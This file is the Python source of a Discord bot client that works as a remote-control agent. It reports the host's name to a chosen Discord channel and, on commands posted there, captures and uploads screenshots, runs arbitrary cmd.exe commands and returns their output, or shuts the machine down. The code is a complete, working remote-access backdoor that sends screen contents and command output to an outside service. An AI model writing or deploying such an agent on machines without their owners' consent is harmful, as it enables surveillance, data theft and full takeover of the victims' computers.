# client.py
import discord
from discord.ext import commands
import subprocess
import pyautogui
import os
import asyncio
from io import BytesIO
import socket

intents = discord.Intents.default()
intents.message_content = True
client = commands.Bot(command_prefix="!", intents=intents)

# Unique ID for this PC (based on hostname)
PC_ID = socket.gethostname()

# Replace with your Discord channel ID and bot token
TARGET_CHANNEL_ID = YOUR_CHANNEL_ID_HERE  # Integer channel ID
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Your bot token

@client.event
async def on_ready():
    print(f"Connected as {client.user}")
    channel = client.get_channel(TARGET_CHANNEL_ID)
    if channel:
        await channel.send(f"PC `{PC_ID}` has connected! Use `!control {PC_ID}` to start controlling this PC.")

@client.command()
async def ss(ctx):
    if ctx.channel.id != TARGET_CHANNEL_ID:
        return
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    with open("screenshot.png", "rb") as f:
        picture = discord.File(f)
        await ctx.send(f"Screenshot from `{PC_ID}`:", file=picture)
    os.remove("screenshot.png")

@client.command()
async def run(ctx, *, command):
    if ctx.channel.id != TARGET_CHANNEL_ID:
        return
    result = subprocess.run(f"cmd.exe /c {command}", capture_output=True, text=True, shell=True)
    output = result.stdout if result.stdout else result.stderr
    await ctx.send(f"Output from `{PC_ID}`:\n```\n{output}\n```")

# Add more commands as needed (e.g., shutdown, type, etc.)
# Example: shutdown
@client.command()
async def shutdown(ctx):
    if ctx.channel.id != TARGET_CHANNEL_ID:
        return
    subprocess.run("shutdown -s -t 30", shell=True)
    await ctx.send(f"`{PC_ID}` shutting down in 30 seconds!")

client.run(BOT_TOKEN)